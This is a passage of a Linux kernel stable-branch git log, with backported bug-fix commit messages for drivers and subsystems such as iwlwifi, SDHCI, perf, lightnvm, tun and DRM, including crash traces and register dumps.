[] iwl\_trans\_pcie\_dump\_regs+0x3fd/0x3fd [iwlwifi]
[] iwl\_fw\_error\_dump+0x4f5/0xe8b [iwlwifi]
[] \_\_iwl\_mvm\_mac\_start+0x5a/0x21a [iwlmvm]
[] iwl\_mvm\_mac\_start+0xd4/0x103 [iwlmvm]
[] drv\_start+0xa1/0xc5 [iwl7000\_mac80211]
[] ieee80211\_reconfig+0x145/0xf50 [mac80211]
[] ieee80211\_resume+0x62/0x66 [mac80211]
[] wiphy\_resume+0xa9/0xc6 [cfg80211]
The station id of the aux station is set to 0xff in step 3
and because we don't really allocate a new station id for
the auxliary station (as explained in 16), we end up sending
a command to the firmware asking to connect the queue
to station id 0xff. This makes the firmware crash with the
following information:
0x00002093 | ADVANCED\_SYSASSERT
0x000002F0 | trm\_hw\_status0
0x00000000 | trm\_hw\_status1
0x00000B38 | branchlink2
0x0001978C | interruptlink1
0x00000000 | interruptlink2
0xFF080501 | data1
0xDEADBEEF | data2
0xDEADBEEF | data3
Firmware error during reconfiguration - reprobe!
FW error in SYNC CMD SCD\_QUEUE\_CFG
Fix this by clearing IWL\_MVM\_STATUS\_HW\_RESTART\_REQUESTED
in iwl\_mvm\_mac\_stop(). We won't be able to collect debug
data anyway and when we will brought up again, we will
have a clean state from the firmware perspective.
Since we won't have IWL\_MVM\_STATUS\_IN\_HW\_RESTART set in
step 12) we won't get to the 2093 ASSERT either.
Fixes: bf8b286f86fc ("iwlwifi: mvm: defer setting IWL\_MVM\_STATUS\_IN\_HW\_RESTART")
Signed-off-by: Emmanuel Grumbach
Signed-off-by: Luca Coelho
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit e364a986fe4192536b2dd4d84fa90c9d3662cda6
Author: Shaul Triebitz
Date: Wed Jun 6 17:20:58 2018 +0300
iwlwifi: pcie: avoid empty free RB queue
[ Upstream commit 868a1e863f95183f00809363fefba6d4f5bcd116 ]
If all free RB queues are empty, the driver will never restock the
free RB queue. That's because the restocking happens in the Rx flow,
and if the free queue is empty there will be no Rx.
Although there's a background worker (a.k.a. allocator) allocating
memory for RBs so that the Rx handler can restock them, the worker may
run only after the free queue has become empty (and then it is too
late for restocking as explained above).
There is a solution for that called 'emergency': If the number of used
RB's reaches half the amount of all RB's, the Rx handler will not wait
for the allocator but immediately allocate memory for the used RB's
and restock the free queue.
But, since the used RB's is per queue, it may happen that the used
RB's are spread between the queues such that the emergency check will
fail for each of the queues
(and still run out of RBs, causing the above symptom).
To fix it, move to emergency mode if the sum of \*all\* used RBs (for
all Rx queues) reaches half the amount of all RB's
Signed-off-by: Shaul Triebitz
Signed-off-by: Luca Coelho
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit ba4a1b62a2d742df9e9c607ac53b3bf33496508f
Author: Masahiro Yamada
Date: Fri Sep 28 13:16:01 2018 +0900
mtd: rawnand: denali: set SPARE\_AREA\_SKIP\_BYTES register to 8 if unset
[ Upstream commit 0d55c668b218a1db68b5044bce4de74e1bd0f0c8 ]
NAND devices need additional data area (OOB) for error correction,
but it is also used for Bad Block Marker (BBM). In many cases, the
first byte in OOB is used for BBM, but the location actually depends
on chip vendors. The NAND controller should preserve the precious
BBM to keep track of bad blocks.
In Denali IP, the SPARE\_AREA\_SKIP\_BYTES register is used to specify
the number of bytes to skip from the start of OOB. The ECC engine
will automatically skip the specified number of bytes when it gets
access to OOB area.
The same value for SPARE\_AREA\_SKIP\_BYTES should be used between
firmware and the operating system if you intend to use the NAND
device across the control hand-off.
In fact, the current denali.c code expects firmware to have already
set the SPARE\_AREA\_SKIP\_BYTES register, then reads the value out.
If no firmware (or bootloader) has initialized the controller, the
register value is zero, which is the default after power-on-reset.
In other words, the Linux driver cannot initialize the controller
by itself.
Some possible solutions are:
[1] Add a DT property to specify the skipped bytes in OOB
[2] Associate the preferred value with compatible
[3] Hard-code the default value in the driver
My first attempt was [1], but in the review process, [3] was suggested
as a counter-implementation.
(https://lore.kernel.org/patchwork/patch/983055/)
The default value 8 was chosen to match to the boot ROM of the UniPhier
platform. The preferred value may vary by platform. If so, please
trade up to a different solution.
Signed-off-by: Masahiro Yamada
Reviewed-by: Boris Brezillon
Signed-off-by: Miquel Raynal
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 8c9e66266a1662bae7f532fffe9e7fc1fb7548c3
Author: Wang Dongsheng
Date: Thu Aug 16 12:48:42 2018 +0800
sdhci: acpi: add free\_slot callback
[ Upstream commit c7eabbee3de99347105faa7fd925a500ccf43baf ]
The device specific resource can be free in free\_slot after
removing host controller.
Signed-off-by: Wang Dongsheng
Acked-by: Adrian Hunter
Signed-off-by: Ulf Hansson
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 8be558fb46dfc949af7db88e1de2df18fdbe3a79
Author: Yu Zhao
Date: Sun Sep 23 14:39:24 2018 -0600
mmc: sdhci-pci-o2micro: Add quirk for O2 Micro dev 0x8620 rev 0x01
[ Upstream commit 5169894982bb67486d93cc1e10151712bb86bcb6 ]
This device reports SDHCI\_CLOCK\_INT\_STABLE even though it's not
ready to take SDHCI\_CLOCK\_CARD\_EN. The symptom is that reading
SDHCI\_CLOCK\_CONTROL after enabling the clock shows absence of the
bit from the register (e.g. expecting 0x0000fa07 = 0x0000fa03 |
SDHCI\_CLOCK\_CARD\_EN but only observed the first operand).
mmc1: Timeout waiting for hardware cmd interrupt.
mmc1: sdhci: ============ SDHCI REGISTER DUMP ===========
mmc1: sdhci: Sys addr: 0x00000000 | Version: 0x00000603
mmc1: sdhci: Blk size: 0x00000000 | Blk cnt: 0x00000000
mmc1: sdhci: Argument: 0x00000000 | Trn mode: 0x00000000
mmc1: sdhci: Present: 0x01ff0001 | Host ctl: 0x00000001
mmc1: sdhci: Power: 0x0000000f | Blk gap: 0x00000000
mmc1: sdhci: Wake-up: 0x00000000 | Clock: 0x0000fa03
mmc1: sdhci: Timeout: 0x00000000 | Int stat: 0x00000000
mmc1: sdhci: Int enab: 0x00ff0083 | Sig enab: 0x00ff0083
mmc1: sdhci: AC12 err: 0x00000000 | Slot int: 0x00000000
mmc1: sdhci: Caps: 0x25fcc8bf | Caps\_1: 0x00002077
mmc1: sdhci: Cmd: 0x00000000 | Max curr: 0x005800c8
mmc1: sdhci: Resp[0]: 0x00000000 | Resp[1]: 0x00000000
mmc1: sdhci: Resp[2]: 0x00000000 | Resp[3]: 0x00000000
mmc1: sdhci: Host ctl2: 0x00000008
mmc1: sdhci: ADMA Err: 0x00000000 | ADMA Ptr: 0x00000000
mmc1: sdhci: ============================================
The problem happens during wakeup from S3. Adding a delay quirk
after power up reliably fixes the problem.
Signed-off-by: Yu Zhao
Signed-off-by: Ulf Hansson
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit f9fa6d72d149630e6e83f944f90d3b77d84fd0f5
Author: Ben Peddell
Date: Mon Oct 8 20:41:13 2018 +0800
bcache: Populate writeback\_rate\_minimum attribute
[ Upstream commit 7567c2a2ad9e80a2ce977eef535e64b61899633e ]
Forgot to include the maintainers with my first email.
Somewhere between Michael Lyle's original
"bcache: PI controller for writeback rate V2" patch dated 07 Sep 2017
and 1d316e6 bcache: implement PI controller for writeback rate,
the mapping of the writeback\_rate\_minimum attribute was dropped.
Re-add the missing sysfs writeback\_rate\_minimum attribute mapping to
"allow the user to specify a minimum rate at which dirty blocks are
retired."
Fixes: 1d316e6 ("bcache: implement PI controller for writeback rate")
Signed-off-by: Ben Peddell
Signed-off-by: Coly Li
Signed-off-by: Jens Axboe
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 46b8a8d2f33a341d763e21b9d93d29e2e0978faf
Author: Prarit Bhargava
Date: Mon Oct 8 11:06:19 2018 -0400
cpupower: Fix coredump on VMWare
[ Upstream commit f69ffc5d3db8f1f03fd6d1df5930f9a1fbd787b6 ]
cpupower crashes on VMWare guests. The guests have the AMD PStateDef MSR
(0xC0010064 + state number) set to zero. As a result fid and did are zero
and the crash occurs because of a divide by zero (cof = fid/did). This
can be prevented by checking the enable bit in the PStateDef MSR before
calculating cof. By doing this the value of pstate[i] remains zero and
the value can be tested before displaying the active Pstates.
Check the enable bit in the PstateDef register for all supported families
and only print out enabled Pstates.
Signed-off-by: Prarit Bhargava
Cc: Shuah Khan
Cc: Stafford Horne
Signed-off-by: Shuah Khan (Samsung OSG)
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 3d8b0617b2a5564090e962e9d3ee32f995e1b656
Author: Sanskriti Sharma
Date: Tue Oct 2 10:29:10 2018 -0400
perf strbuf: Match va\_{add,copy} with va\_end
[ Upstream commit ce49d8436cffa9b7a6a5f110879d53e89dbc6746 ]
Ensure that all code paths in strbuf\_addv() call va\_end() on the
ap\_saved copy that was made.
Fixes the following coverity complaint:
Error: VARARGS (CWE-237): [#def683]
tools/perf/util/strbuf.c:106: missing\_va\_end: va\_end was not called
for "ap\_saved".
Signed-off-by: Sanskriti Sharma
Reviewed-by: Jiri Olsa
Cc: Joe Lawrence
Link: http://lkml.kernel.org/r/1538490554-8161-2-git-send-email-sansharm@redhat.com
Signed-off-by: Arnaldo Carvalho de Melo
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 74a5a6e86f825566f441594bdca225fb023e146c
Author: Sanskriti Sharma
Date: Tue Oct 2 10:29:11 2018 -0400
perf tools: Cleanup trace-event-info 'tdata' leak
[ Upstream commit faedbf3fd19f2511a39397f76359e4cc6ee93072 ]
Free tracing\_data structure in tracing\_data\_get() error paths.
Fixes the following coverity complaint:
Error: RESOURCE\_LEAK (CWE-772):
leaked\_storage: Variable "tdata" going out of scope leaks the storage
Signed-off-by: Sanskriti Sharma
Reviewed-by: Jiri Olsa
Cc: Joe Lawrence
Link: http://lkml.kernel.org/r/1538490554-8161-3-git-send-email-sansharm@redhat.com
Signed-off-by: Arnaldo Carvalho de Melo
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 6b6ed6f4c33b0a35511e3850187cee2e9dbc3242
Author: Sanskriti Sharma
Date: Tue Oct 2 10:29:14 2018 -0400
perf tools: Free temporary 'sys' string in read\_event\_files()
[ Upstream commit 1e44224fb0528b4c0cc176bde2bb31e9127eb14b ]
For each system in a given pevent, read\_event\_files() reads in a
temporary 'sys' string. Be sure to free this string before moving onto
to the next system and/or leaving read\_event\_files().
Fixes the following coverity complaints:
Error: RESOURCE\_LEAK (CWE-772):
tools/perf/util/trace-event-read.c:343: overwrite\_var: Overwriting
"sys" in "sys = read\_string()" leaks the storage that "sys" points to.
tools/perf/util/trace-event-read.c:353: leaked\_storage: Variable "sys"
going out of scope leaks the storage it points to.
Signed-off-by: Sanskriti Sharma
Reviewed-by: Jiri Olsa
Cc: Joe Lawrence
Link: http://lkml.kernel.org/r/1538490554-8161-6-git-send-email-sansharm@redhat.com
Signed-off-by: Arnaldo Carvalho de Melo
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 91747a58abc5cc3e2dfb14b97c1bfa2d87700645
Author: Nathan Chancellor
Date: Mon Oct 8 11:08:47 2018 -0700
spi: spi-ep93xx: Use dma\_data\_direction for ep93xx\_spi\_dma\_{finish,prepare}
[ Upstream commit a1108c7b2efb892350ba6a0e932dfd45622f4e2b ]
Clang warns when one enumerated type is implicitly converted to another.
drivers/spi/spi-ep93xx.c:342:62: warning: implicit conversion from
enumeration type 'enum dma\_transfer\_direction' to different enumeration
type 'enum dma\_data\_direction' [-Wenum-conversion]
nents = dma\_map\_sg(chan->device->dev, sgt->sgl, sgt->nents, dir);
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^~~~
./include/linux/dma-mapping.h:428:58: note: expanded from macro
'dma\_map\_sg'
#define dma\_map\_sg(d, s, n, r) dma\_map\_sg\_attrs(d, s, n, r, 0)
~~~~~~~~~~~~~~~~ ^
drivers/spi/spi-ep93xx.c:348:57: warning: implicit conversion from
enumeration type 'enum dma\_transfer\_direction' to different enumeration
type 'enum dma\_data\_direction' [-Wenum-conversion]
dma\_unmap\_sg(chan->device->dev, sgt->sgl, sgt->nents, dir);
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^~~~
./include/linux/dma-mapping.h:429:62: note: expanded from macro
'dma\_unmap\_sg'
#define dma\_unmap\_sg(d, s, n, r) dma\_unmap\_sg\_attrs(d, s, n, r, 0)
~~~~~~~~~~~~~~~~~~ ^
drivers/spi/spi-ep93xx.c:377:56: warning: implicit conversion from
enumeration type 'enum dma\_transfer\_direction' to different enumeration
type 'enum dma\_data\_direction' [-Wenum-conversion]
dma\_unmap\_sg(chan->device->dev, sgt->sgl, sgt->nents, dir);
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^~~~
./include/linux/dma-mapping.h:429:62: note: expanded from macro
'dma\_unmap\_sg'
#define dma\_unmap\_sg(d, s, n, r) dma\_unmap\_sg\_attrs(d, s, n, r, 0)
~~~~~~~~~~~~~~~~~~ ^
3 warnings generated.
dma\_{,un}map\_sg expect an enum of type dma\_data\_direction but this
driver uses dma\_transfer\_direction for everything. Convert the driver to
use dma\_data\_direction for these two functions.
There are two places that strictly require an enum of type
dma\_transfer\_direction: the direction member in struct dma\_slave\_config
and the direction parameter in dmaengine\_prep\_slave\_sg. To avoid using
an explicit cast, add a simple function, ep93xx\_dma\_data\_to\_trans\_dir,
to safely map between the two types because they are not 1 to 1 in
meaning.
Signed-off-by: Nathan Chancellor
Reviewed-by: Nick Desaulniers
Reviewed-by: Mika Westerberg
Signed-off-by: Mark Brown
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit feea46d8f5b046d9d18116bb180b8b41f7090960
Author: Javier González
Date: Tue Oct 9 13:11:35 2018 +0200
lightnvm: pblk: fix race condition on metadata I/O
[ Upstream commit d8adaa3b86324c6186d0adf74bc256bdacfffdb6 ]
In pblk, when a new line is allocated, metadata for the previously
written line is scheduled. This is done through a fixed memory region
that is shared through time and contexts across different lines and
therefore protected by a lock. Unfortunately, this lock is not properly
covering all the metadata used for sharing this memory regions,
resulting in a race condition.
This patch fixes this race condition by protecting this metadata
properly.
Fixes: dd2a43437337 ("lightnvm: pblk: sched. metadata on write thread")
Signed-off-by: Javier González
Signed-off-by: Matias Bjørling
Signed-off-by: Jens Axboe
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit afa8688bd3bf30e374e0134d44df542d6c51d298
Author: Jia-Ju Bai
Date: Tue Oct 9 13:12:00 2018 +0200
lightnvm: pblk: fix two sleep-in-atomic-context bugs
[ Upstream commit 7325b4bbe5952e3e939f15de812f2ee0c0d33ca9 ]
The driver may sleep with holding a spinlock.
The function call paths (from bottom to top) in Linux-4.16 are:
[FUNC] nvm\_dev\_dma\_alloc(GFP\_KERNEL)
drivers/lightnvm/pblk-core.c, 754:
nvm\_dev\_dma\_alloc in pblk\_line\_submit\_smeta\_io
drivers/lightnvm/pblk-core.c, 1048:
pblk\_line\_submit\_smeta\_io in pblk\_line\_init\_bb
drivers/lightnvm/pblk-core.c, 1434:
pblk\_line\_init\_bb in pblk\_line\_replace\_data
drivers/lightnvm/pblk-recovery.c, 980:
pblk\_line\_replace\_data in pblk\_recov\_l2p
drivers/lightnvm/pblk-recovery.c, 976:
spin\_lock in pblk\_recov\_l2p
[FUNC] bio\_map\_kern(GFP\_KERNEL)
drivers/lightnvm/pblk-core.c, 762:
bio\_map\_kern in pblk\_line\_submit\_smeta\_io
drivers/lightnvm/pblk-core.c, 1048:
pblk\_line\_submit\_smeta\_io in pblk\_line\_init\_bb
drivers/lightnvm/pblk-core.c, 1434:
pblk\_line\_init\_bb in pblk\_line\_replace\_data
drivers/lightnvm/pblk-recovery.c, 980:
pblk\_line\_replace\_data in pblk\_recov\_l2p
drivers/lightnvm/pblk-recovery.c, 976:
spin\_lock in pblk\_recov\_l2p
To fix these bugs, the call to pblk\_line\_replace\_data()
is moved out of the spinlock protection.
These bugs are found by my static analysis tool DSAC.
Signed-off-by: Jia-Ju Bai
Reviewed-by: Javier González
Signed-off-by: Matias Bjørling
Signed-off-by: Jens Axboe
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit beaff0a07547b7d8ef6466a621998557f197e1ab
Author: Javier González
Date: Tue Oct 9 13:12:07 2018 +0200
lightnvm: pblk: fix race on sysfs line state
[ Upstream commit 44cdbdc657b23f75736eca3e88b781f009104363 ]
pblk exposes a sysfs interface that represents its internal state. Part
of this state is the map bitmap for the current open line, which should
be protected by the line lock to avoid a race when freeing the line
metadata. Currently, it is not.
This patch makes sure that the line state is consistent and NULL
bitmap pointers are not dereferenced.
Signed-off-by: Javier González
Signed-off-by: Matias Bjørling
Signed-off-by: Jens Axboe
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit fd524f47ecc5060679d4485964b429d2d91b3387
Author: Thierry Reding
Date: Fri Sep 21 12:10:48 2018 +0200
hwmon: (pwm-fan) Set fan speed to 0 on suspend
[ Upstream commit 95dcd64bc5a27080beaa344edfe5bdcca3d2e7dc ]
Technically this is not required because disabling the PWM should be
enough. However, when support for atomic operations was implemented in
the PWM subsystem, only actual changes to the PWM channel are applied
during pwm\_config(), which means that during after resume from suspend
the old settings won't be applied.
One possible solution is for the PWM driver to implement its own PM
operations such that settings from before suspend get applied on resume.
This has the disadvantage of completely ignoring any particular ordering
requirements that PWM user drivers might have, so it is best to leave it
up to the user drivers to apply the settings that they want at the
appropriate time.
Another way to solve this would be to read back the current state of the
PWM at the time of resume. That way, in case the configuration was lost
during suspend, applying the old settings in PWM user drivers would
actually get them applied because they differ from the current settings.
However, not all PWM drivers support reading the hardware state, and not
all hardware may support it.
The best workaround at this point seems to be to let PWM user drivers
tell the PWM subsystem that the PWM is turned off by, in addition to
disabling it, also setting the duty cycle to 0. This causes the resume
operation to apply a configuration that is different from the current
configuration, resulting in the proper state from before suspend getting
restored.
Signed-off-by: Thierry Reding
Signed-off-by: Guenter Roeck
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 340029579377f7ee70f41903add4a6d8aefcf918
Author: Janosch Frank
Date: Tue Oct 2 10:57:52 2018 +0200
s390/sthyi: Fix machine name validity indication
[ Upstream commit b5130dc2224d1881f24224c0590c6d97f2168d6a ]
When running as a level 3 guest with no host provided sthyi support
sclp\_ocf\_cpc\_name\_copy() will only return zeroes. Zeroes are not a
valid group name, so let's not indicate that the group name field is
valid.
Also the group name is not dependent on stsi, let's not return based
on stsi before setting it.
Fixes: 95ca2cb57985 ("KVM: s390: Add sthyi emulation")
Signed-off-by: Janosch Frank
Signed-off-by: Martin Schwidefsky
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 034d29a7ef6acaea6a76793c1f8aec5c586319f6
Author: Serhey Popovych
Date: Tue Oct 9 21:21:01 2018 +0300
tun: Consistently configure generic netdev params via rtnetlink
[ Upstream commit df52eab23d703142c766ac00bdb8db19d71238d0 ]
Configuring generic network device parameters on tun will fail in
presence of IFLA\_INFO\_KIND attribute in IFLA\_LINKINFO nested attribute
since tun\_validate() always return failure.
This can be visualized with following ip-link(8) command sequences:
# ip link set dev tun0 group 100
# ip link set dev tun0 group 100 type tun
RTNETLINK answers: Invalid argument
with contrast to dummy and veth drivers:
# ip link set dev dummy0 group 100
# ip link set dev dummy0 type dummy
# ip link set dev veth0 group 100
# ip link set dev veth0 group 100 type veth
Fix by returning zero in tun\_validate() when @data is NULL that is
always in case since rtnl\_link\_ops->maxtype is zero in tun driver.
Fixes: f019a7a594d9 ("tun: Implement ip link del tunXXX")
Signed-off-by: Serhey Popovych
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit dcaa9d656d105d396de0f7cd332ac032c287fc69
Author: Ryan C Goodfellow
Date: Fri Oct 12 11:09:01 2018 -0700
nfp: devlink port split support for 1x100G CXP NIC
[ Upstream commit 5948185b97fa1f83d7855e638a72982a1073ebf5 ]
This commit makes it possible to use devlink to split the 100G CXP
Netronome into two 40G interfaces. Currently when you ask for 2
interfaces, the math in src/nfp\_devlink.c:nfp\_devlink\_port\_split
calculates that you want 5 lanes per port because for some reason
eth\_port.port\_lanes=10 (shouldn't this be 12 for CXP?). What we really
want when asking for 2 breakout interfaces is 4 lanes per port. This
commit makes that happen by calculating based on 8 lanes if 10 are
present.
Signed-off-by: Ryan C Goodfellow
Reviewed-by: Jakub Kicinski
Reviewed-by: Greg Weeks
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 4db6211a5bdaf96f255afa06871cd062c6a81b1b
Author: Suzuki K Poulose
Date: Tue Oct 9 14:47:05 2018 +0100
arm64: cpufeature: ctr: Fix cpu capability check for late CPUs
[ Upstream commit 8ab66cbe63aeaf9e5970fb4aaef1c660fca59321 ]
The matches() routine for a capability must honor the "scope"
passed to it and return the proper results.
i.e, when passed with SCOPE\_LOCAL\_CPU, it should check the
status of the capability on the current CPU. This is used by
verify\_local\_cpu\_capabilities() on a late secondary CPU to make
sure that it's compliant with the established system features.
However, ARM64\_HAS\_CACHE\_{IDC/DIC} always checks the system wide
registers and this could mean that a late secondary CPU could return
"true" (since the CPU hasn't updated the system wide registers yet)
and thus lead the system in an inconsistent state, where
the system assumes it has IDC/DIC feature, while the new CPU
doesn't.
Fixes: commit 6ae4b6e0578886eb36 ("arm64: Add support for new control bits CTR\_EL0.DIC and CTR\_EL0.IDC")
Cc: Philip Elcan
Cc: Shanker Donthineni
Cc: Mark Rutland
Cc: Will Deacon
Signed-off-by: Suzuki K Poulose
Signed-off-by: Catalin Marinas
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit ddb265c328806a5e982842f35639cf1024be0b99
Author: Omar Sandoval
Date: Thu Oct 11 12:20:41 2018 -0700
swim: fix cleanup on setup error
[ Upstream commit 1448a2a5360ae06f25e2edc61ae070dff5c0beb4 ]
If we fail to allocate the request queue for a disk, we still need to
free that disk, not just the previous ones. Additionally, we need to
cleanup the previous request queues.
Signed-off-by: Omar Sandoval
Signed-off-by: Jens Axboe
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 140a8e218463f723f4cc64f6603b33b4ca04e668
Author: Omar Sandoval
Date: Thu Oct 11 12:20:49 2018 -0700
ataflop: fix error handling during setup
[ Upstream commit 71327f547ee3a46ec5c39fdbbd268401b2578d0e ]
Move queue allocation next to disk allocation to fix a couple of issues:
- If add\_disk() hasn't been called, we should clear disk->queue before
calling put\_disk().
- If we fail to allocate a request queue, we still need to put all of
the disks, not just the ones that we allocated queues for.
Signed-off-by: Omar Sandoval
Signed-off-by: Jens Axboe
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 3967f93cb91b29a9cc64d4920a82aae353b762dd
Author: Paolo Abeni
Date: Tue Oct 16 16:52:05 2018 +0200
netfilter: xt\_nat: fix DNAT target for shifted portmap ranges
[ Upstream commit cb20f2d2c0507d60d94ef896991e95708f051dd1 ]
The commit 2eb0f624b709 ("netfilter: add NAT support for shifted
portmap ranges") did not set the checkentry/destroy callbacks for
the newly added DNAT target. As a result, rulesets using only
such nat targets are not effective, as the relevant conntrack hooks
are not enabled.
The above affect also nft\_compat rulesets.
Fix the issue adding the missing initializers.
Fixes: 2eb0f624b709 ("netfilter: add NAT support for shifted portmap ranges")
Signed-off-by: Paolo Abeni
Signed-off-by: Pablo Neira Ayuso
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 0713bef08f090b7df69b58b73f41fdc370366435
Author: Waiman Long
Date: Thu Oct 18 21:45:17 2018 -0400
locking/lockdep: Fix debug\_locks off performance problem
[ Upstream commit 9506a7425b094d2f1d9c877ed5a78f416669269b ]
It was found that when debug\_locks was turned off because of a problem
found by the lockdep code, the system performance could drop quite
significantly when the lock\_stat code was also configured into the
kernel. For instance, parallel kernel build time on a 4-socket x86-64
server nearly doubled.
Further analysis into the cause of the slowdown traced back to the
frequent call to debug\_locks\_off() from the \_\_lock\_acquired() function
probably due to some inconsistent lockdep states with debug\_locks
off. The debug\_locks\_off() function did an unconditional atomic xchg
to write a 0 value into debug\_locks which had already been set to 0.
This led to severe cacheline contention in the cacheline that held
debug\_locks. As debug\_locks is being referenced in quite a few different
places in the kernel, this greatly slow down the system performance.
To prevent that trashing of debug\_locks cacheline, lock\_acquired()
and lock\_contended() now checks the state of debug\_locks before
proceeding. The debug\_locks\_off() function is also modified to check
debug\_locks before calling \_\_debug\_locks\_off().
Signed-off-by: Waiman Long
Cc: Andrew Morton
Cc: Linus Torvalds
Cc: Paul E. McKenney
Cc: Peter Zijlstra
Cc: Thomas Gleixner
Cc: Will Deacon
Link: http://lkml.kernel.org/r/1539913518-15598-1-git-send-email-longman@redhat.com
Signed-off-by: Ingo Molnar
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 92cc2f9792aae53d6b3911b2d78db2efe1b189ad
Author: Masahisa Kojima
Date: Tue Oct 23 20:24:28 2018 +0900
net: socionext: Reset tx queue in ndo\_stop
[ Upstream commit 8d5b0bf611ec5b7618d5b772dddc93b8afa78cb8 ]
We observed that packets and bytes count are not reset
when user performs interface down. Eventually, tx queue is
exhausted and packets will not be sent out.
To avoid this problem, resets tx queue in ndo\_stop.
Fixes: 533dd11a12f6 ("net: socionext: Add Synquacer NetSec driver")
Signed-off-by: Masahisa Kojima
Signed-off-by: Yoshitoyo Osaki
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 9da20df2fbf67d207c1944e45c8b3d45a60c8155
Author: Wolfram Sang
Date: Fri Oct 19 21:15:26 2018 +0200
i2c: rcar: cleanup DMA for all kinds of failure
[ Upstream commit 31d86033a0749a0463ea654130b2de5c163154f1 ]
DMA needs to be cleaned up not only on timeout, but on all errors where
it has been setup before.
Fixes: 73e8b0528346 ("i2c: rcar: add DMA support")
Signed-off-by: Wolfram Sang
Signed-off-by: Wolfram Sang
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 4f7381656228d00686b89c342fd089315b2ca5e2
Author: Masami Hiramatsu
Date: Thu Oct 18 22:13:02 2018 +0900
selftests: ftrace: Add synthetic event syntax testcase
[ Upstream commit ba0e41ca81b935b958006c7120466e2217357827 ]
Add a testcase to check the syntax and field types for
synthetic\_events interface.
Link: http://lkml.kernel.org/r/153986838264.18251.16627517536956299922.stgit@devbox
Acked-by: Shuah Khan
Signed-off-by: Masami Hiramatsu
Signed-off-by: Steven Rostedt (VMware)
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 89c678ab4908b0936d8e2af13c99f642da778dd9
Author: Leo Li
Date: Mon Oct 15 09:46:40 2018 -0400
drm: Get ref on CRTC commit object when waiting for flip\_done
[ Upstream commit 4364bcb2cd21d042bde4776448417ddffbc54045 ]
This fixes a general protection fault, caused by accessing the contents
of a flip\_done completion object that has already been freed. It occurs
due to the preemption of a non-blocking commit worker thread W by
another commit thread X. X continues to clear its atomic state at the
end, destroying the CRTC commit object that W still needs. Switching
back to W and accessing the commit objects then leads to bad results.
Worker W becomes preemptable when waiting for flip\_done to complete. At
this point, a frequently occurring commit thread X can take over. Here's
an example where W is a worker thread that flips on both CRTCs, and X
does a legacy cursor update on both CRTCs:
...
1. W does flip work
2. W runs commit\_hw\_done()
3. W waits for flip\_done on CRTC 1
4. > flip\_done for CRTC 1 completes
5. W finishes waiting for CRTC 1
6. W waits for flip\_done on CRTC 2
7. > Preempted by X
8. > flip\_done for CRTC 2 completes
9. X atomic\_check: hw\_done and flip\_done are complete on all CRTCs
10. X updates cursor on both CRTCs
11. X destroys atomic state
12. X done
13. > Switch back to W
14. W waits for flip\_done on CRTC 2
15. W raises general protection fault
The error looks like so:
general protection fault: 0000 [#1] PREEMPT SMP PTI
\*\*snip\*\*
Call Trace:
lock\_acquire+0xa2/0x1b0
\_raw\_spin\_lock\_irq+0x39/0x70
wait\_for\_completion\_timeout+0x31/0x130
drm\_atomic\_helper\_wait\_for\_flip\_done+0x64/0x90 [drm\_kms\_helper]
amdgpu\_dm\_atomic\_commit\_tail+0xcae/0xdd0 [amdgpu]
commit\_tail+0x3d/0x70 [drm\_kms\_helper]
process\_one\_work+0x212/0x650
worker\_thread+0x49/0x420
kthread+0xfb/0x130
ret\_from\_fork+0x3a/0x50
Modules linked in: x86\_pkg\_temp\_thermal amdgpu(O) chash(O)
gpu\_sched(O) drm\_kms\_helper(O) syscopyarea sysfillrect sysimgblt
fb\_sys\_fops ttm(O) drm(O)
Note that i915 has this issue masked, since hw\_done is signaled after
waiting for flip\_done. Doing so will block the cursor update from
happening until hw\_done is signaled, preventing the cursor commit from
destroying the state.
v2: The reference on the commit object needs to be obtained before
hw\_done() is signaled, since that's the point where another commit
is allowed to modify the state. Assuming that the
new\_crtc\_state->commit object still exists within flip\_done() is
incorrect.
Fix by getting a reference in setup\_commit(), and releasing it
during default\_clear().
Signed-off-by: Leo Li
Reviewed-by: Daniel Vetter
Signed-off-by: Harry Wentland
Link: https://patchwork.freedesktop.org/patch/msgid/1539611200-6184-1-git-send-email-sunpeng.li@amd.com
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 9fdd80c2ef128c334b37d5072e67ec99cdcffad8
Author: Heiner Kallweit
Date: Tue Oct 16 19:35:17 2018 +0200
